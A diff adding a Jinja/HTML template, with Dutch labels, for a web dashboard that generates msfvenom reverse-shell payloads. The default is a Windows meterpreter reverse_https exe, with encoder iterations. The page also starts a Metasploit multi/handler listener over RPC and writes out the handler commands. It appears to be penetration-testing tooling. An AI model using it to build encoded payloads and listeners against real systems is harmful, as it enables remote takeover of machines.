@@ -1,0 +1,332 @@
+{% extends "bootstrap/base.html" %}
+{% block title %}Msfvenom generator{% endblock %}
+
+{% block styles %}
+<link rel="stylesheet" href="{{ url_for('static', filename='css/generator.css') }}" />
+<style nonce="{{ csp_nonce }}">
+.platform-tabs { display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 12px; }
+.platform-tab  { padding: 4px 12px; border-radius: 4px; border: 1px solid #333; background: #1a1a2e;
+                 cursor: pointer; font-size: 12px; color: var(--text-muted, #aaa); transition: all .15s; }
+.platform-tab.active, .platform-tab:hover { background: #2d3a4a; color: #fff; border-color: #60a5fa; }
+.handler-section { margin-top: 16px; padding: 12px 16px; border: 1px solid #2d3a4a;
+                   border-radius: 6px; background: #12121e; }
+.handler-section h3 { margin: 0 0 8px; font-size: 13px; color: var(--text-muted, #aaa); }
+.cmd-preview { font-family: monospace; font-size: 12px; padding: 8px 12px; background: #0d0d1a;
+               border: 1px solid #2a2a3a; border-radius: 4px; color: #a5b4fc; word-break: break-all;
+               min-height: 32px; }
+.badge-success { background: #14532d; color: #4ade80; padding: 2px 8px; border-radius: 4px; font-size: 11px; }
+.badge-fail    { background: #7f1d1d; color: #fca5a5; padding: 2px 8px; border-radius: 4px; font-size: 11px; }
+.badge-run     { background: #1e3a5f; color: #93c5fd; padding: 2px 8px; border-radius: 4px; font-size: 11px; }
+.gen-output-min { min-height: 200px; }
+.hidden { display: none; }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="gen-header">
+  <div class="breadcrumbs"><a href="/">Start</a> / <a href="/dashboard/msf">Metasploit</a> / Msfvenom generator</div>
+  <h1>Msfvenom payload generator</h1>
+  <p>Genereer payloads met msfvenom en start optioneel direct een handler via Metasploit RPC.</p>
+</div>
+
+<div class="grid cols-2 gap-16">
+
+  {# ── Linker kolom: configuratie ── #}
+  <div>
+    <section class="card">
+      <div class="card-head"><h2>Configuratie</h2></div>
+      <div class="card-body">
+
+        {# Platform tabs #}
+        <label class="fs-13 mb-4">Platform</label>
+        <div class="platform-tabs" id="platform-tabs">
+          {% for platform in payloads.keys() %}
+          <button type="button" class="platform-tab{% if loop.first %} active{% endif %}"
+                  data-platform="{{ platform }}">{{ platform }}</button>
+          {% endfor %}
+        </div>
+
+        <div class="gen-form">
+          <div class="field span-2">
+            <label for="payload">Payload</label>
+            <select class="input" id="payload" name="payload">
+              {% for platform, plist in payloads.items() %}
+              {% for p in plist %}
+              <option value="{{ p }}" data-platform="{{ platform }}"
+                {% if p == 'windows/x64/meterpreter/reverse_https' %}selected{% endif %}>{{ p }}</option>
+              {% endfor %}
+              {% endfor %}
+            </select>
+          </div>
+
+          <div class="field">
+            <label for="lhost">LHOST</label>
+            <input class="input" type="text" id="lhost" name="lhost" placeholder="10.0.0.1" required />
+          </div>
+          <div class="field">
+            <label for="lport">LPORT</label>
+            <input class="input" type="text" id="lport" name="lport" value="443" />
+          </div>
+
+          <div class="field">
+            <label for="fmt">Formaat / output</label>
+            <select class="input" id="fmt" name="fmt">
+              {% for key, label in formats.items() %}
+              <option value="{{ key }}"{% if key == 'exe' %} selected{% endif %}>{{ label }}</option>
+              {% endfor %}
+            </select>
+          </div>
+          <div class="field">
+            <label for="filename">Bestandsnaam</label>
+            <input class="input" type="text" id="filename" name="filename" value="shell" placeholder="shell" />
+            <span class="help">Output: http/payloads/&lt;naam&gt;.ext</span>
+          </div>
+
+          <div class="field">
+            <label for="encoder">Encoder</label>
+            <select class="input" id="encoder" name="encoder">
+              <option value="">Geen</option>
+              {% for enc in encoders %}
+              <option value="{{ enc }}">{{ enc }}</option>
+              {% endfor %}
+            </select>
+          </div>
+          <div class="field">
+            <label for="iterations">Encoder iterations</label>
+            <input class="input" type="number" id="iterations" name="iterations" min="1" max="20" value="3" />
+          </div>
+
+          <div class="field span-2">
+            <label for="extra_opts">Extra opties <span class="help">(KEY=waarde, spatie-gescheiden)</span></label>
+            <input class="input" type="text" id="extra_opts" name="extra_opts"
+                   placeholder="EXITFUNC=thread LURI=/beacon" />
+          </div>
+        </div>
+
+        {# Commando preview #}
+        <label class="fs-13 mt-10 mb-4">Commando preview</label>
+        <div class="cmd-preview" id="cmd-preview">msfvenom …</div>
+
+        <div class="gen-actions mt-12">
+          <button type="button" id="gen-btn" class="btn btn-primary">Genereer payload</button>
+          <span id="gen-status" class="status"></span>
+        </div>
+      </div>
+    </section>
+
+    {# Handler #}
+    <section class="card mt-14">
+      <div class="card-head"><h2>Handler starten</h2></div>
+      <div class="card-body">
+        <p class="help">Start automatisch een multi/handler listener via Metasploit RPC met de payload en poort uit het formulier.</p>
+        <div class="d-flex gap-8 items-center flex-wrap">
+          <button type="button" id="handler-btn" class="btn">Start handler via MSF RPC</button>
+          <span id="handler-status" class="status"></span>
+        </div>
+        <div id="handler-info" class="cmd-preview mt-8 hidden"></div>
+      </div>
+    </section>
+  </div>
+
+  {# ── Rechter kolom: output ── #}
+  <div>
+    <section class="card">
+      <div class="card-head">
+        <h2>Uitvoer</h2>
+        <span id="run-badge" class="ml-auto"></span>
+      </div>
+      <div class="card-body">
+        <pre id="gen-output" class="gen-output gen-output-min"></pre>
+        <div id="gen-download" class="gen-download hidden">
+          <a id="gen-dl-link" href="#" class="btn btn-success">Download gegenereerd bestand</a>
+          <button type="button" id="copy-path-btn" class="btn">Kopieer pad</button>
+          <code id="gen-path" class="fs-12"></code>
+        </div>
+      </div>
+    </section>
+  </div>
+
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script nonce="{{ csp_nonce }}">
+(function () {
+  "use strict";
+
+  var csrfMeta = document.querySelector('meta[name="csrf-token"]');
+  var csrf = csrfMeta ? csrfMeta.getAttribute('content') : '';
+
+  // ── Platform tabs ────────────────────────────────
+  var payloadSel = document.getElementById('payload');
+  var tabs = document.querySelectorAll('.platform-tab');
+
+  function filterPayloads(platform) {
+    Array.from(payloadSel.options).forEach(function (opt) {
+      opt.hidden = opt.getAttribute('data-platform') !== platform;
+    });
+    // Selecteer eerste zichtbare optie
+    var first = Array.from(payloadSel.options).find(function (o) { return !o.hidden; });
+    if (first) first.selected = true;
+    updatePreview();
+  }
+
+  tabs.forEach(function (tab) {
+    tab.addEventListener('click', function () {
+      tabs.forEach(function (t) { t.classList.remove('active'); });
+      tab.classList.add('active');
+      filterPayloads(tab.getAttribute('data-platform'));
+    });
+  });
+  filterPayloads(document.querySelector('.platform-tab.active').getAttribute('data-platform'));
+
+  // ── Commando preview ─────────────────────────────
+  function updatePreview() {
+    var payload   = payloadSel.value;
+    var lhost     = document.getElementById('lhost').value || 'LHOST';
+    var lport     = document.getElementById('lport').value || '443';
+    var fmt       = document.getElementById('fmt').value;
+    var filename  = document.getElementById('filename').value || 'shell';
+    var encoder   = document.getElementById('encoder').value;
+    var itr       = document.getElementById('iterations').value;
+    var extra     = document.getElementById('extra_opts').value.trim();
+
+    var extMap = {
+      exe:'exe', dll:'dll', elf:'elf', macho:'macho', ps1:'ps1', asp:'asp',
+      aspx:'aspx', jsp:'jsp', war:'war', 'hta-psh':'hta', vba:'vba',
+      raw:'bin', c:'c', python:'py', bash:'sh', pl:'pl'
+    };
+    var ext = extMap[fmt] || fmt;
+    var out = 'http/payloads/' + filename.replace(/[^a-zA-Z0-9_\-]/g,'') + '.' + ext;
+
+    var parts = ['msfvenom', '-p', payload, 'LHOST=' + lhost, 'LPORT=' + lport];
+    if (encoder) { parts.push('-e', encoder, '-i', itr); }
+    if (extra) extra.split(/\s+/).forEach(function(o){ if(o) parts.push(o); });
+    parts.push('-f', fmt, '-o', out);
+    document.getElementById('cmd-preview').textContent = parts.join(' ');
+  }
+
+  ['payload','lhost','lport','fmt','filename','encoder','iterations','extra_opts'].forEach(function(id) {
+    document.getElementById(id).addEventListener('input', updatePreview);
+    document.getElementById(id).addEventListener('change', updatePreview);
+  });
+
+  // ── Generator ────────────────────────────────────
+  var currentRunId = null;
+  var pollTimer    = null;
+
+  function setBadge(status) {
+    var badge = document.getElementById('run-badge');
+    var map = { running: ['badge-run', 'Bezig…'], success: ['badge-success', 'Klaar'], failed: ['badge-fail', 'Mislukt'] };
+    var b = map[status];
+    badge.className = b ? b[0] : '';
+    badge.textContent = b ? b[1] : '';
+  }
+
+  function pollStatus() {
+    if (!currentRunId) return;
+    fetch('/api/msf/venom/status/' + currentRunId)
+      .then(function (r) { return r.json(); })
+      .then(function (d) {
+        if (!d.ok) return;
+        document.getElementById('gen-output').textContent = (d.output || []).join('\n');
+        setBadge(d.status);
+        if (d.status === 'running') {
+          pollTimer = setTimeout(pollStatus, 800);
+          return;
+        }
+        document.getElementById('gen-btn').disabled = false;
+        document.getElementById('gen-status').textContent = '';
+        if (d.status === 'success') {
+          var dl = document.getElementById('gen-download');
+          dl.style.display = 'flex';
+          document.getElementById('gen-dl-link').href = '/api/msf/venom/download/' + currentRunId;
+          document.getElementById('gen-path').textContent = d.output_path;
+        }
+      });
+  }
+
+  document.getElementById('gen-btn').addEventListener('click', function () {
+    var lhost = document.getElementById('lhost').value.trim();
+    if (!lhost) { document.getElementById('gen-status').textContent = 'LHOST is verplicht'; return; }
+
+    if (pollTimer) clearTimeout(pollTimer);
+    document.getElementById('gen-btn').disabled = true;
+    document.getElementById('gen-status').textContent = 'Genereren…';
+    document.getElementById('gen-output').textContent = '';
+    document.getElementById('gen-download').style.display = 'none';
+    document.getElementById('run-badge').className = '';
+    document.getElementById('run-badge').textContent = '';
+
+    fetch('/api/msf/venom/generate', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'X-CSRFToken': csrf },
+      body: JSON.stringify({
+        payload:    payloadSel.value,
+        lhost:      lhost,
+        lport:      document.getElementById('lport').value,
+        format:     document.getElementById('fmt').value,
+        filename:   document.getElementById('filename').value,
+        encoder:    document.getElementById('encoder').value,
+        iterations: parseInt(document.getElementById('iterations').value, 10) || 0,
+        extra_opts: document.getElementById('extra_opts').value,
+      })
+    })
+    .then(function (r) { return r.json(); })
+    .then(function (d) {
+      if (!d.ok) {
+        document.getElementById('gen-status').textContent = d.error || 'Fout';
+        document.getElementById('gen-btn').disabled = false;
+        return;
+      }
+      currentRunId = d.run_id;
+      setBadge('running');
+      pollTimer = setTimeout(pollStatus, 600);
+    })
+    .catch(function (e) {
+      document.getElementById('gen-status').textContent = 'Netwerkfout: ' + e;
+      document.getElementById('gen-btn').disabled = false;
+    });
+  });
+
+  // ── Kopieer pad ──────────────────────────────────
+  document.getElementById('copy-path-btn').addEventListener('click', function () {
+    var txt = document.getElementById('gen-path').textContent;
+    if (txt) navigator.clipboard.writeText(txt);
+  });
+
+  // ── Handler starten via MSF RPC ──────────────────
+  document.getElementById('handler-btn').addEventListener('click', function () {
+    var payload = payloadSel.value;
+    var lhost   = document.getElementById('lhost').value.trim();
+    var lport   = document.getElementById('lport').value.trim();
+    var info    = document.getElementById('handler-info');
+    var status  = document.getElementById('handler-status');
+
+    if (!lhost) { status.textContent = 'LHOST is verplicht'; return; }
+
+    status.textContent = 'Handler starten…';
+    info.style.display = 'none';
+
+    fetch('/api/msf/handlers', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'X-CSRFToken': csrf },
+      body: JSON.stringify({ payload: payload, lhost: lhost, lport: lport })
+    })
+    .then(function (r) { return r.json(); })
+    .then(function (d) {
+      if (d.ok) {
+        status.textContent = 'Handler gestart (job ' + d.job_id + ')';
+        info.style.display = 'block';
+        info.textContent = 'use exploit/multi/handler\nset PAYLOAD ' + payload +
+          '\nset LHOST ' + d.lhost + '\nset LPORT ' + d.lport + '\nrun -j';
+      } else {
+        status.textContent = 'Fout: ' + (d.error || 'onbekend');
+      }
+    })
+    .catch(function (e) { status.textContent = 'Netwerkfout: ' + e; });
+  });
+
+})();
+</script>
+{% endblock %}
